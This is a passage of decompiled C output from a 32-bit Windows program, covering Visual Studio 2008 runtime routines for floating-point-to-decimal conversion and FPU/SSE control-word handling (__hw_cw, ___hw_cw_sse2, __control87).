  ushort uStack_3a;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined local_2c;
  undefined uStack_2b;
  undefined uStack_2a;
  undefined uStack_29;
  undefined4 local_24;
  ushort uStack_20;
  ushort uStack_1e;
  ushort uStack_1c;
  undefined local_1a;
  byte bStack_19;
  byte local_14;
  undefined uStack_13;
  ushort uStack_12;
  undefined4 local_10;
  ushort local_c;
  ushort uStack_a;
  uint local_8;
  
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar4 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_14 = (byte)param_1;
  uStack_13 = (undefined)((uint)param_1 >> 8);
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_10._0_2_ = (ushort)param_2;
  iVar21 = CONCAT22((ushort)local_10,uStack_12);
  local_10._2_2_ = (ushort)(param_2 >> 0x10);
  local_c = param_3;
  uVar9 = param_3 & 0x8000;
  uVar14 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c = 0xcc;
  uStack_2b = 0xcc;
  uStack_2a = 0xfb;
  uStack_29 = 0x3f;
  if (uVar9 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((((short)uVar14 == 0) && (param_2 == 0)) && (param_1 == 0)) {
    *param_6 = 0;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 3) = 1;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
    iVar2 = iVar4;
    goto LAB_0042127e;
  }
  if ((short)uVar14 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((uVar9 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_00420adc;
        pcVar26 = "1#INF";
      }
      else {
        if (param_1 != 0) {
LAB_00420adc:
          pcVar26 = "1#QNAN";
          goto LAB_00420ae1;
        }
        pcVar26 = "1#IND";
      }
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar26 = "1#SNAN";
LAB_00420ae1:
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 6;
    }
    param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    goto LAB_0042127e;
  }
  local_50 = (short)(((uVar14 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar14 * 0x4d10
                    >> 0x10);
  uVar16 = (uint)local_50;
  local_24._0_2_ = 0;
  local_1a = (undefined)uVar14;
  bStack_19 = (byte)(uVar14 >> 8);
  uStack_1e = (ushort)local_10;
  uStack_1c = local_10._2_2_;
  local_24._2_2_ = (ushort)param_1;
  local_68 = &DAT_0042c0a0;
  uStack_20 = uStack_12;
  if (-uVar16 != 0) {
    iVar5 = param_1;
    uVar14 = -uVar16;
    iVar2 = iVar4;
    if (0 < (int)uVar16) {
      local_68 = &DAT_0042c200;
      uVar14 = uVar16;
    }
    while (uVar14 != 0) {
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      iVar4 = CONCAT22(local_c,local_10._2_2_);
      local_68 = local_68 + 0x54;
      if ((uVar14 & 7) != 0) {
        piVar11 = (int *)(local_68 + (uVar14 & 7) * 0xc);
        if (0x7fff < *(ushort *)piVar11) {
          local_40 = (undefined2)*piVar11;
          uStack_3e._0_2_ = (undefined2)((uint)*piVar11 >> 0x10);
          piVar3 = piVar11 + 2;
          uStack_3e._2_2_ = (undefined2)piVar11[1];
          uStack_3a = (ushort)((uint)piVar11[1] >> 0x10);
          piVar11 = (int *)&local_40;
          local_38 = *piVar3;
          iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
          uStack_3e._0_2_ = (undefined2)iVar2;
          uStack_3e._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
        }
        local_58 = 0;
        local_14 = 0;
        uStack_13 = 0;
        uStack_12 = 0;
        local_10._0_2_ = 0;
        iVar21 = 0;
        local_10._2_2_ = 0;
        local_c = 0;
        iVar4 = 0;
        uStack_a = 0;
        uVar19 = (*(ushort *)((int)piVar11 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
        uVar10 = CONCAT11(bStack_19,local_1a) & 0x7fff;
        uVar13 = *(ushort *)((int)piVar11 + 10) & 0x7fff;
        uVar20 = uVar13 + uVar10;
        if (((uVar10 < 0x7fff) && (uVar13 < 0x7fff)) && (uVar20 < 0xbffe)) {
          if (0x3fbf < uVar20) {
            if (((uVar10 == 0) &&
                (uVar20 = uVar20 + 1,
                (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
               ((CONCAT22(uStack_1e,uStack_20) == 0 &&
                (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
              local_1a = 0;
              bStack_19 = 0;
              goto LAB_00420df2;
            }
            if ((((uVar13 == 0) && (uVar20 = uVar20 + 1, (piVar11[2] & 0x7fffffffU) == 0)) &&
                (piVar11[1] == 0)) && (*piVar11 == 0)) goto LAB_00420c11;
            local_5c = 0;
            puVar25 = &local_10;
            local_44 = 5;
            do {
              local_54 = local_44;
              if (0 < local_44) {
                local_70 = (ushort *)((int)&local_24 + local_5c * 2);
                local_6c = piVar11 + 2;
                do {
                  bVar6 = false;
                  uVar16 = puVar25[-1] + (uint)*local_70 * (uint)*(ushort *)local_6c;
                  if ((uVar16 < (uint)puVar25[-1]) ||
                     (uVar16 < (uint)*local_70 * (uint)*(ushort *)local_6c)) {
                    bVar6 = true;
                  }
                  puVar25[-1] = uVar16;
                  if (bVar6) {
                    *(short *)puVar25 = *(short *)puVar25 + 1;
                  }
                  local_70 = local_70 + 1;
                  local_6c = (int *)((int)local_6c + -2);
                  local_54 = local_54 + -1;
                } while (0 < local_54);
              }
              puVar25 = (undefined4 *)((int)puVar25 + 2);
              local_5c = local_5c + 1;
              local_44 = local_44 + -1;
            } while (0 < local_44);
            uVar20 = uVar20 + 0xc002;
            if ((short)uVar20 < 1) {
LAB_00420d22:
              uVar20 = uVar20 - 1;
              if ((short)uVar20 < 0) {
                uVar16 = (uint)(ushort)-uVar20;
                uVar20 = 0;
                do {
                  if ((local_14 & 1) != 0) {
                    local_58 = local_58 + 1;
                  }
                  iVar4 = CONCAT22(uStack_a,local_c);
                  uVar22 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
                  uStack_a = uStack_a >> 1;
                  local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
                  uVar23 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                  uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                  uVar16 = uVar16 - 1;
                  local_10._0_2_ = (ushort)(uVar22 >> 1);
                  local_14 = (byte)uVar23;
                  uStack_13 = (undefined)(uVar23 >> 8);
                } while (uVar16 != 0);
                if (local_58 != 0) {
                  local_14 = local_14 | 1;
                }
              }
            }
            else {
              do {
                uVar13 = local_10._2_2_;
                uVar10 = uStack_12;
                if ((uStack_a & 0x8000) != 0) break;
                iVar21 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
                local_14 = (byte)iVar21;
                uStack_13 = (undefined)((uint)iVar21 >> 8);
                uStack_12 = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
                local_10._0_2_ = (ushort)iVar21 | uVar10 >> 0xf;
                local_10._2_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(uStack_a,local_c) * 2;
                local_c = (ushort)iVar21 | uVar13 >> 0xf;
                uVar20 = uVar20 - 1;
                uStack_a = (ushort)((uint)iVar21 >> 0x10);
              } while (0 < (short)uVar20);
              if ((short)uVar20 < 1) goto LAB_00420d22;
            }
            if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
               (iVar4 = CONCAT22(local_c,local_10._2_2_),
               iVar21 = CONCAT22((ushort)local_10,uStack_12),
               (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
              if (CONCAT22((ushort)local_10,uStack_12) == -1) {
                uStack_12 = 0;
                local_10._0_2_ = 0;
                iVar21 = 0;
                if (CONCAT22(local_c,local_10._2_2_) == -1) {
                  local_10._2_2_ = 0;
                  local_c = 0;
                  if (uStack_a == 0xffff) {
                    uStack_a = 0x8000;
                    uVar20 = uVar20 + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                  else {
                    uStack_a = uStack_a + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                }
                else {
                  iVar4 = CONCAT22(local_c,local_10._2_2_) + 1;
                  local_10._2_2_ = (ushort)iVar4;
                  local_c = (ushort)((uint)iVar4 >> 0x10);
                }
              }
              else {
                iVar21 = CONCAT22((ushort)local_10,uStack_12) + 1;
                uStack_12 = (ushort)iVar21;
                local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar4 = CONCAT22(local_c,local_10._2_2_);
              }
            }
            local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
            uStack_12 = (ushort)iVar21;
            local_c = (ushort)((uint)iVar4 >> 0x10);
            local_10._2_2_ = (ushort)iVar4;
            if (uVar20 < 0x7fff) {
              bStack_19 = (byte)(uVar20 >> 8) | (byte)(uVar19 >> 8);
              local_24._0_2_ = uStack_12;
              local_24._2_2_ = (ushort)local_10;
              uStack_20 = local_10._2_2_;
              iVar5 = CONCAT22(local_10._2_2_,(ushort)local_10);
              uStack_1e = local_c;
              uStack_1c = uStack_a;
              local_1a = (undefined)uVar20;
            }
            else {
              uStack_20 = 0;
              uStack_1e = 0;
              local_24._0_2_ = 0;
              local_24._2_2_ = 0;
              iVar5 = 0;
              iVar12 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
              uStack_1c = (ushort)iVar12;
              local_1a = (undefined)((uint)iVar12 >> 0x10);
              bStack_19 = (byte)((uint)iVar12 >> 0x18);
            }
            goto LAB_00420df2;
          }
LAB_00420c11:
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
        }
        else {
          iVar21 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
        }
        uStack_20 = 0;
        uStack_1e = 0;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        iVar5 = 0;
        iVar21 = 0;
        iVar4 = 0;
      }
LAB_00420df2:
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      local_c = (ushort)((uint)iVar4 >> 0x10);
      local_10._2_2_ = (ushort)iVar4;
      local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
      uStack_12 = (ushort)iVar21;
      param_1 = CONCAT22(uStack_12,local_24._2_2_);
      param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
      uVar14 = (int)uVar14 >> 3;
    }
  }
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  if (0x3ffe < (ushort)(uVar14 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12 = 0;
    local_10._0_2_ = 0;
    local_10._2_2_ = 0;
    local_c = 0;
    uStack_a = 0;
    uVar16 = uVar14 >> 0x10 & 0x7fff;
    iVar21 = uVar16 + 0x3ffb;
    if (((ushort)uVar16 < 0x7fff) && ((ushort)iVar21 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar21) {
        if (((((ushort)uVar16 == 0) &&
             (iVar21 = uVar16 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
            (CONCAT22(uStack_1e,uStack_20) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          param_2 = 0;
          uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
          goto LAB_004210b6;
        }
        local_5c = 0;
        puVar25 = &local_10;
        local_44 = 5;
        do {
          local_58 = local_44;
          if (0 < local_44) {
            local_4c = (ushort *)&local_2c;
            puVar8 = (ushort *)((int)&local_24 + local_5c * 2);
            do {
              bVar6 = false;
              uVar16 = puVar25[-1] + (uint)*local_4c * (uint)*puVar8;
              if ((uVar16 < (uint)puVar25[-1]) || (uVar16 < (uint)*local_4c * (uint)*puVar8)) {
                bVar6 = true;
              }
              puVar25[-1] = uVar16;
              if (bVar6) {
                *(short *)puVar25 = *(short *)puVar25 + 1;
              }
              local_4c = local_4c + -1;
              puVar8 = puVar8 + 1;
              local_58 = local_58 + -1;
            } while (0 < local_58);
          }
          puVar25 = (undefined4 *)((int)puVar25 + 2);
          local_5c = local_5c + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar21 = iVar21 + 0xc002;
        if ((short)iVar21 < 1) {
LAB_00420faf:
          uVar20 = (ushort)(iVar21 + 0xffff);
          if ((short)uVar20 < 0) {
            uVar16 = -(iVar21 + 0xffff);
            uVar14 = uVar16 & 0xffff;
            uVar20 = uVar20 + (short)uVar16;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar4 = CONCAT22(uStack_a,local_c);
              uVar16 = CONCAT22(local_10._2_2_,(ushort)local_10);
              iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
              local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
              uStack_a = uStack_a >> 1;
              local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
              uVar22 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
              uVar14 = uVar14 - 1;
              local_10._0_2_ = (ushort)(uVar16 >> 1);
              local_14 = (byte)uVar22;
              uStack_13 = (undefined)(uVar22 >> 8);
            } while (uVar14 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar10 = local_10._2_2_;
            uVar20 = uStack_12;
            if ((short)uStack_a < 0) break;
            iVar4 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar4;
            uStack_13 = (undefined)((uint)iVar4 >> 8);
            uStack_12 = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
            local_10._0_2_ = (ushort)iVar4 | uVar20 >> 0xf;
            local_10._2_2_ = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(uStack_a,local_c) * 2;
            local_c = (ushort)iVar4 | uVar10 >> 0xf;
            iVar21 = iVar21 + 0xffff;
            uStack_a = (ushort)((uint)iVar4 >> 0x10);
          } while (0 < (short)iVar21);
          uVar20 = (ushort)iVar21;
          if ((short)uVar20 < 1) goto LAB_00420faf;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar21 = CONCAT22(local_c,local_10._2_2_), uVar16 = CONCAT22((ushort)local_10,uStack_12)
           , (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22((ushort)local_10,uStack_12) == -1) {
            uVar16 = 0;
            if (CONCAT22(local_c,local_10._2_2_) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar20 = uVar20 + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
            }
            else {
              iVar21 = CONCAT22(local_c,local_10._2_2_) + 1;
            }
          }
          else {
            uVar16 = CONCAT22((ushort)local_10,uStack_12) + 1;
            iVar21 = CONCAT22(local_c,local_10._2_2_);
          }
        }
        local_10._0_2_ = (ushort)(uVar16 >> 0x10);
        uStack_12 = (ushort)uVar16;
        local_c = (ushort)((uint)iVar21 >> 0x10);
        local_10._2_2_ = (ushort)iVar21;
        param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        if (uVar20 < 0x7fff) {
          bStack_19 = (byte)(uVar20 >> 8) | bStack_19 & 0x80;
          uStack_20 = local_10._2_2_;
          uStack_1e = local_c;
          uStack_1c = uStack_a;
          local_1a = (undefined)uVar20;
        }
        else {
          uStack_20 = 0;
          uStack_1e = 0;
          uVar16 = 0;
          iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
          param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        }
        goto LAB_004210b6;
      }
      iVar21 = 0;
    }
    else {
      iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    uStack_1e = 0;
    uStack_20 = 0;
    uStack_1c = (ushort)iVar21;
    local_1a = (undefined)((uint)iVar21 >> 0x10);
    bStack_19 = (byte)((uint)iVar21 >> 0x18);
    param_2 = 0;
    uVar16 = 0;
  }
LAB_004210b6:
  *param_6 = local_50;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar21 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 0x10) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    local_48 = 8;
    uVar14 = uVar16;
    do {
      uVar16 = uVar14 << 1;
      iVar4 = CONCAT22(uStack_1e,uStack_20) * 2;
      uStack_20 = (ushort)iVar4 | (ushort)(uVar14 >> 0x1f);
      iVar5 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2;
      uStack_1c = (ushort)iVar5 | uStack_1e >> 0xf;
      local_48 = local_48 + -1;
      uStack_1e = (ushort)((uint)iVar4 >> 0x10);
      local_1a = (undefined)((uint)iVar5 >> 0x10);
      bStack_19 = (byte)((uint)iVar5 >> 0x18);
      uVar14 = uVar16;
    } while (local_48 != 0);
    if ((iVar21 < 0) && (uVar22 = -iVar21 & 0xff, uVar22 != 0)) {
      do {
        iVar4 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
        uVar23 = CONCAT22(uStack_1e,uStack_20);
        iVar21 = CONCAT22(uStack_1e,uStack_20);
        uVar16 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 1;
        uStack_1c = (ushort)uVar16;
        local_1a = (undefined)(uVar16 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        uStack_1e = uStack_1e >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
        uVar16 = uVar14 >> 1 | iVar21 << 0x1f;
        uVar22 = uVar22 - 1;
        uStack_20 = (ushort)(uVar23 >> 1);
        local_24._0_2_ = (undefined2)(uVar14 >> 1);
        local_24._2_2_ = (ushort)(uVar16 >> 0x10);
        uVar14 = CONCAT22(local_24._2_2_,(undefined2)local_24);
      } while (0 < (int)uVar22);
    }
    psVar1 = param_6 + 2;
    psVar17 = psVar1;
    uVar20 = uStack_1e;
    for (iVar21 = param_4 + 1; 0 < iVar21; iVar21 = iVar21 + -1) {
      local_24._2_2_ = (ushort)(uVar16 >> 0x10);
      local_24._0_2_ = (undefined2)uVar16;
      iVar2 = CONCAT22(uStack_20,local_24._2_2_);
      local_38 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
      uVar14 = CONCAT22(uVar20,uStack_20) * 2;
      uVar22 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2 | (uint)(uVar20 >> 0xf)) * 2 |
               uVar14 >> 0x1f;
      uVar23 = (uVar14 | local_24._2_2_ >> 0xf) * 2 | (uVar16 << 1) >> 0x1f;
      uVar14 = uVar16 * 5;
      if ((uVar14 < uVar16 * 4) || (uVar24 = uVar23, uVar14 < uVar16)) {
        uVar24 = uVar23 + 1;
        bVar6 = false;
        if ((uVar24 < uVar23) || (uVar24 == 0)) {
          bVar6 = true;
        }
        if (bVar6) {
          uVar22 = uVar22 + 1;
        }
      }
      uVar23 = CONCAT22(uVar20,uStack_20) + uVar24;
      if ((uVar23 < uVar24) || (uVar23 < CONCAT22(uVar20,uStack_20))) {
        uVar22 = uVar22 + 1;
      }
      iVar4 = (uVar22 + local_38) * 2;
      uStack_1c = (ushort)iVar4 | (ushort)(uVar23 >> 0x1f);
      uVar16 = uVar16 * 10;
      local_1a = (undefined)((uint)iVar4 >> 0x10);
      uStack_20 = (ushort)(uVar23 * 2) | (ushort)(uVar14 >> 0x1f);
      *(char *)psVar17 = (char)((uint)iVar4 >> 0x18) + '0';
      psVar17 = (short *)((int)psVar17 + 1);
      uStack_1e = (ushort)(uVar23 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar20;
      uVar20 = uStack_1e;
    }
    psVar18 = psVar17 + -1;
    uStack_1e = uVar20;
    if (*(char *)((int)psVar17 + -1) < '5') {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '0'));
          psVar18 = (short *)((int)psVar18 + -1)) {
      }
      if (psVar18 < psVar1) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
        *(char *)psVar1 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_0042127e;
      }
    }
    else {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '9'));
          psVar18 = (short *)((int)psVar18 + -1)) {
        *(char *)psVar18 = '0';
      }
      if (psVar18 < psVar1) {
        psVar18 = (short *)((int)psVar18 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar18 = *(char *)psVar18 + '\x01';
    }
    cVar15 = ((char)psVar18 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar15;
    *(undefined *)(cVar15 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined *)((int)param_6 + 3) = 1;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_0042127e:
  uStack_3e = iVar2;
  local_24 = uVar16;
  local_10 = param_2;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __hw_cw
// 
// Library: Visual Studio 2008 Release

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2008 Release

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2008 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (DAT_0046ec40 != 0) {
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
